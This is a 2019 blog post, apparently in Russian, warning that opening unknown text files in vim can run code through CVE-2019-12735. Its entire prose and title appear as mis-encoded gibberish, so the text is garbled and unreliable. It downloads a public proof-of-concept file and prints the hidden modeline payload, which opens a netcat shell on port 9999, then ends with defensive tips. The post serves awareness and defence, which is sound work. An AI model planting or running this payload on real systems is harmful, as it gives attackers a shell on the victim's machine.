---
layout: post
title:  "–û—Ç–∫—Ä—ã–≤–∞–µ–º –Ω–µ–∑–Ω–∞–∫–æ–º—ã–µ —Ñ–∞–π–ª—ã —Å –æ—Å—Ç–æ—Ä–æ–∂–Ω–æ—Å—Ç—å—é –¥–∞–∂–µ —Ç–µ–∫—Å—Ç–æ–≤—ã–º —Ä–µ–¥–∞–∫—Ç–æ—Ä–æ–º!"
meta_description: "–î–µ–º–æ–Ω—Å—Ç—Ä–∞—Ü–∏—è —É—è–∑–≤–∏–º–æ—Å—Ç–∏ –≤ —Ç–µ–∫—Å—Ç–æ–≤–æ–º —Ä–µ–¥–∞–∫—Ç–æ—Ä–µ vim —Å –æ–±—ä—è—Å–Ω–µ–Ω–∏—è–º–∏ –ø–æ—á–µ–º—É –æ—Ç–∫—Ä—ã–≤–∞—Ç—å –Ω–µ–∑–Ω–∞–∫–æ–º—ã–µ —Ç–µ–∫—Å—Ç–æ–≤—ã–µ —Ñ–∞–π–ª—ã –æ–ø–∞—Å–Ω–æ –¥–∞–∂–µ –≤ —Ç–µ–∫—Å—Ç–æ–≤–æ–º —Ä–µ–¥–∞–∫—Ç–æ—Ä–µ"
date:   2019-09-18
tags: vim exploits vulnerability
categories: article
author: "soko1"
---

–ú–Ω–æ–≥–∏–º –∏–∑–≤–µ—Å—Ç–Ω–æ, —á—Ç–æ –æ—Ç–∫—Ä—ã–≤–∞—Ç—å –ø—Ä–∏–∫—Ä–µ–ø–ª–µ–Ω–Ω—ã–µ —Ñ–∞–π–ª—ã –∫ –ø–∏—Å—å–º—É –Ω–∞ email –±—ã–≤–∞–µ—Ç –Ω–µ–±–µ–∑–æ–ø–∞—Å–Ω–æ, –Ω–æ —Å–∫–æ–ª—å–∫–æ —á–µ–ª–æ–≤–µ–∫ –ø—Ä–∏ —ç—Ç–æ–º –æ—Ç–∫—Ä—ã–≤–∞–µ—Ç –Ω–µ–∑–Ω–∞–∫–æ–º—ã–µ —Ç–µ–∫—Å—Ç–æ–≤—ã–µ —Ñ–∞–π–ª—ã, –Ω–∞–ø—Ä–∏–º–µ—Ä, –≤ —Ç–µ–∫—Å—Ç–æ–≤–æ–º —Ä–µ–¥–∞–∫—Ç–æ—Ä–µ? –û—Å–æ–±–µ–Ω–Ω–æ –µ—Å–ª–∏ —ç—Ç–æ Linux –∏ –∫–∞–∫–æ–π-–Ω–∏–±—É–¥—å –ø—Ä–æ–≤–µ—Ä–µ–Ω–Ω—ã–º –≤—Ä–µ–º–µ–Ω–µ–º —Ç–µ–∫—Å—Ç–æ–≤—ã–π —Ä–µ–¥–∞–∫—Ç–æ—Ä vim/emacs! –ß—Ç–æ –º–æ–∂–µ—Ç —Å–ª—É—á–∏—Ç—å—Å—è? 

## –ö—Ä–∞—Ç–∫–æ–µ –æ–ø–∏—Å–∞–Ω–∏–µ –Ω–µ–¥–∞–≤–Ω–µ–π —É—è–∑–≤–∏–º–æ—Å—Ç–∏ –≤ vim

–ù–µ —Ö–æ—á—É –≤–¥–∞–≤–∞—Ç—å—Å—è –≤ —Ç–µ—Ö–Ω–∏—á–µ—Å–∫–∏–µ –ø–æ–¥—Ä–æ–±–Ω–æ—Å—Ç–∏ –¥—ã—Ä–∫–∏, –∫–æ—Ç–æ—Ä—É—é –Ω–∞—à–ª–∏ –≤ —Ç–µ–∫—Å—Ç–æ–≤–æ–º —Ä–µ–¥–∞–∫—Ç–æ—Ä–µ vim, –æ–± —ç—Ç–æ–º –Ω–∞–ø–∏—Å–∞–Ω–æ –Ω–µ –º–∞–ª–æ —Å—Ç–∞—Ç–µ–π (—É—è–∑–≤–∏–º–æ—Å—Ç–∏ –ø—Ä–∏—Å–≤–æ–µ–Ω –Ω–æ–º–µ—Ä <a href="https://nvd.nist.gov/vuln/detail/CVE-2019-12735" target="_blank">CVE-2019-12735</a>), –Ω–æ —Ö–æ—á—É —Ä–∞—Å—Å–∫–∞–∑–∞—Ç—å –æ —Ç–æ–º, –∫–∞–∫—É—é –æ–ø–∞—Å–Ω–æ—Å—Ç—å —ç—Ç–æ –Ω–µ—Å—ë—Ç –∏ –ø–æ—á–µ–º—É –Ω–∞–¥–æ –±—ã—Ç—å –ø—Ä–µ–¥–µ–ª—å–Ω–æ –∞–∫–∫—É—Ä–∞—Ç–Ω—ã–º –¥–∞–∂–µ —Å —Ç–∞–∫–∏–º–∏ –∫–∞–∑–∞–ª–æ—Å—å –±—ã –±–∞–∑–æ–≤—ã–º–∏ –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–∞–º–∏.

–°–º—ã—Å–ª –∞—Ç–∞–∫–∏ –ø—Ä–æ—Å—Ç: –≤–∞–º –ø—Ä–∏—Å—ã–ª–∞—é—Ç —Ñ–∞–π–ª–∏–∫, –≤—ã –µ–≥–æ –æ—Ç–∫—Ä—ã–≤–∞–µ—Ç–µ –≤ vim, –∞ —Ç–µ–º –≤—Ä–µ–º–µ–Ω–µ–º —É –≤–∞—Å –Ω–∞ –∫–æ–º–ø—å—é—Ç–µ—Ä–µ –≤—ã–ø–æ–ª–Ω—è–µ—Ç—Å—è –∫–æ–¥. –ù–∞–ø—Ä–∏–º–µ—Ä, –∫–∞—á–∞–µ—Ç—Å—è —Å —É–¥–∞–ª–µ–Ω–Ω–æ–≥–æ —Å–µ—Ä–≤–µ—Ä–∞ –±–µ–∫–¥–æ—Ä –∏ —É—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ—Ç—Å—è –≤ —Å–∏—Å—Ç–µ–º—É. –ü—Ä–∏ —á–µ–º –≤—ã –¥–∞–∂–µ –Ω–µ –≤–∏–¥–∏—Ç–µ —Ü–µ–ª–∏–∫–æ–º —Å–æ–¥–µ—Ä–∂–∏–º–æ–≥–æ —Ñ–∞–π–ª–∞, –≤—Å—è –≤—ã–ø–æ–ª–Ω—è–µ–º–∞—è –∫–æ–Ω—Å—Ç—Ä—É–∫—Ü–∏—è –∑–∞–º–∞—Å–∫–∏—Ä–æ–≤–∞–Ω–∞ –∏ –Ω–µ –æ—Ç–æ–±—Ä–∞–∂–∞–µ—Ç—Å—è. 

## –î–µ–º–æ–Ω—Å—Ç—Ä–∞—Ü–∏—è —ç–∫—Å–ª–æ–∏—Ç–∞

–†–∞—Å—Å–º–æ—Ç—Ä–∏–º –æ–¥–∏–Ω –∏–∑ —ç–∫—Å–ª–æ–∏—Ç–æ–≤ –¥–ª—è vim. 

–°–∫–∞—á–∞–µ–º —Å–∞–º —ç–∫—Å–ø–ª–æ–∏—Ç:

```
$ wget https://raw.githubusercontent.com/numirias/security/master/data/2019-06-04_ace-vim-neovim/shell.txt
```

–ê —Ç–µ–ø–µ—Ä—å –ø–æ–ø—Ä–æ–±—É–µ–º –µ–≥–æ –ø—Ä–æ—á–∏—Ç–∞—Ç—å, –Ω–∞–ø—Ä–∏–º–µ—Ä, —É—Ç–∏–ª–∏—Ç–æ–π cat:

```
$ cat shell.txt
Nothing here.
```

–ê –≤–æ—Ç —á—Ç–æ –≤ —Ñ–∞–π–ª–∏–∫–µ –Ω–∞—Ö–æ–¥–∏—Ç—Å—è –Ω–∞ —Å–∞–º–æ–º –¥–µ–ª–µ:

```
$ cat -v shell.txt
[?7lSNothing here.:silent! w | call system('nohup nc 127.0.0.1 9999 -e /bin/sh &') | redraw! | file | silent! # " vim: set fen fdm=expr fde=assert_fails('set\ fde=x\ \|\ source\!\ \%') fdl=0: [1G[KNothing here."[D 
```

–¢–æ –µ—Å—Ç—å –≤—ã –∫–∞—á–∞–µ—Ç–µ –Ω–µ–∑–Ω–∞–∫–æ–º—ã–π —Ñ–∞–π–ª–∏–∫, –æ—Ç–∫—Ä—ã–≤–∞–µ—Ç–µ –µ–≥–æ –≤ —É—è–∑–≤–∏–º–æ–º —Ç–µ–∫—Å—Ç–æ–≤–æ–º —Ä–µ–¥–∞–∫—Ç–æ—Ä–µ –∏ —É –≤–∞—Å –æ—Ç–∫—Ä—ã–≤–∞–µ—Ç—Å—è —à–µ–ª–ª –Ω–∞ 9999-–ø–æ—Ä—Ç—É –∏ –¥–µ–ª–∞–π –¥–∞–ª—å—à–µ —Å –≤–∞—à–µ–π –º–∞—à–∏–Ω–æ–π —á—Ç–æ —Ö–æ—á–µ—à—å :) 

## –í—ã–≤–æ–¥—ã

–û—Ç–∫—Ä—ã—Ç–∏–µ –Ω–µ–∑–Ω–∞–∫–æ–º—ã—Ö —Ç–µ–∫—Å—Ç–æ–≤—ã—Ö —Ñ–∞–π–ª–æ–≤ –≤ —Ç–µ–∫—Å—Ç–æ–≤—ã—Ö —Ä–µ–¥–∞–∫—Ç–æ—Ä–∞—Ö ‚Äî –Ω–µ –º–µ–Ω–µ–µ –æ–ø–∞—Å–Ω–æ–µ –¥–µ–π—Å—Ç–≤–∏–µ –Ω–µ–∂–µ–ª–∏ –∑–∞–ø—É—Å–∫ exe/elf-—Ñ–∞–π–ª–æ–≤.

–ï—Å–ª–∏ –≤—ã –Ω–µ –¥–æ–≤–µ—Ä—è–µ—Ç–µ –∏—Å—Ç–æ—á–Ω–∏–∫—É —Å –∫–æ—Ç–æ—Ä–æ–≥–æ —Å–∫–∞—á–µ–Ω —Ñ–∞–π–ª ‚Äî –ª—É—á—à–µ –∑–∞–ø—É—Å—Ç–∏—Ç—å –µ–≥–æ –≤ –∏–∑–æ–ª–∏—Ä–æ–≤–∞–Ω–Ω–æ–º –æ–∫—Ä—É–∂–µ–Ω–∏–∏ –≤—Ä–æ–¥–µ –≤–∏—Ä—Ç—É–∞–ª—å–Ω–æ–π –º–∞—à–∏–Ω—ã, –∏–ª–∏ —Ç–µ—Å—Ç–æ–≤–æ–π vps.

–ö–∞–∫ –≤–∞—Ä–∏–∞–Ω—Ç ‚Äî –¥–æ–±–∞–≤—å—Ç–µ –≤ –≤–∞—à —à–µ–ª–ª (–Ω–∞–ø—Ä–∏–º–µ—Ä, ~/.zshrc) —Å–ª–µ–¥—É—é—â–∏–π alias, —á—Ç–æ–±—ã —Ö–æ—Ç—å –∫–∞–∫-—Ç–æ –æ–±–Ω–∞—Ä—É–∂–∏—Ç—å –≤–æ–∑–º–æ–∂–Ω—É—é –º–∞—Å–∫–∏—Ä–æ–≤–∫—É —à–µ–ª–ª-–∫–æ–¥–∞ –≤ –Ω–µ–∑–Ω–∞–∫–æ–º–æ–º —Ñ–∞–π–ª–µ. –ü—Ä–∏ —É—Å–ª–æ–≤–∏–∏ —á—Ç–æ —ç—Ç–æ –Ω–µ —ç–∫—Å–ø–ª–æ–∏—Ç –∫ —É—Ç–∏–ª–∏—Ç–µ cat, –∏–ª–∏ —Ç–µ—Ä–º–∏–Ω–∞–ª—É :)

```
alias cv='cat -v'
```

–ù—É –∏ –∫–æ–Ω–µ—á–Ω–æ –∂–µ –Ω–µ –∑–∞–±—ã–≤–∞–π—Ç–µ –æ–±–Ω–æ–≤–ª—è—Ç—å –≤—Å—ë –ü–û –∏ –û–° –Ω–∞ –≤—Å–µ—Ö –≤–∞—à–∏—Ö –¥–µ–≤–∞–π—Å–∞—Ö.